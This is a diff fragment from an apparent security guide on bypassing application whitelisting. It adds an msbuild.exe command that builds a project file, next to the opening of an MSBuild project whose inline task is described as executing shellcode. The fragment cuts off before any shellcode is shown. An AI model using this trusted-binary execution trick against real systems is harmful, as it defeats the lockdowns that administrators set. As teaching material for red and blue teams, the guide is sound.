@@ -24,6 +24,10 @@ Despite the power this gives the Administrator in locking down what users can an
 
 The Cn33liz [MSBuildShell ](https://github.com/Cn33liz/MSBuildShell)is one such example.
 
+```text
+C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe test.csproj
+```
+
 ```markup
 <Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
   <!-- This inline task executes shellcode. -->
